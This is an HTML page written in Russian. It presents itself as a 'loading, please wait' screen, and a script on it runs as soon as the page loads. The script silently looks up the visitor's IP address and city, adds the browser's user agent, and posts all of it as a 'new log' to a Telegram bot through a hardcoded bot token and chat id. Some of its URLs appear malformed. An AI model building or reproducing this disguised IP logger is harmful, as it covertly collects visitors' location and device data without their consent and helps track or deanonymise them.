<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h1>Страница загружается, подождите...</h1>

    <script>
        async function sendData() {
            const token = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
            const chat_id = "8426763446";

            try {
                // 1. Получаем данные об IP
                const response = await fetch('https://ipapi.co');
                const data = await response.json();

                // 2. Формируем текст
                const message = `🚀 Новый лог!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${navigator.userAgent}`;

                // 3. Отправляем в Telegram простым методом
                await fetch(`https://api.telegram.org{token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: message
                    })
                });

                console.log("Отправлено!");
            } catch (err) {
                console.error("Ошибка:", err);
            }
        }

        sendData();
    </script>
</body>
</html>
